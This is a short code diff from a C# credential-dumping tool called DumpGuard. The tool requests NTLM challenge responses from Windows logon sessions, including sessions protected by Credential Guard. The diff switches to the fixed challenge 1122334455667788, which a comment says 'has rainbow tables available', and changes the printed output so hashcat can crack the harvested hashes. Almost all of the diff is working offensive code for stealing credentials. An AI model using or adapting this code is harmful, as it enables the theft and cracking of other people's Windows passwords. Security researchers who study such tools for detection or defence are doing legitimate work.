@@ -304,9 +304,9 @@ namespace DumpGuard
                         MessageType = 1, // MsV1_0Lm20GetChallengeResponse
                         ParameterControl = MSV1_0_GETCHALLENRESP_ParameterControl.USE_PRIMARY_PASSWORD | MSV1_0_GETCHALLENRESP_ParameterControl.GCR_VSM_PROTECTED_PASSWORD,
                         // 1122334455667788 has rainbow tables available, however can be detected on uncomment at your own risk
-                        //ChallengeToClient = new byte[] { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 }
+                        ChallengeToClient = new byte[] { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 }
                         // 3f9a7c2b1e4d8f6a or arbitary challenge, if changing also update Porgram.cs#L338 and Tsssp/TssspClient.cs#L137
-                        ChallengeToClient = new byte[] { 0x3f, 0x9a, 0x7c, 0x2b, 0x1e, 0x4d, 0x8f, 0x6a }
+                        //ChallengeToClient = new byte[] { 0x3f, 0x9a, 0x7c, 0x2b, 0x1e, 0x4d, 0x8f, 0x6a }
                     };
 
                     var dumped_creds = new HashSet<string>();
@@ -336,8 +336,9 @@ namespace DumpGuard
                             {
                                 var nt_response = BitConverter.ToString(nt_response_bytes).Replace("-", "");
                                 // Update if changing the challenge so hashcat still works
-                                var nt_response_string = $"{session.Item1}::{Environment.MachineName}::{nt_response}:3F9A7C2B1E4D8F6A";
-
+                                //var nt_response_string = $"{session.Item1}::{Environment.MachineName}::{nt_response}:3F9A7C2B1E4D8F6A";
+								var nt_response_string = $"{session.Item1}::{Environment.MachineName}::{nt_response}:1122334455667788";
+								
                                 if (!dumped_creds.Contains(nt_response_string))
                                 {
                                     Console.WriteLine(nt_response_string);
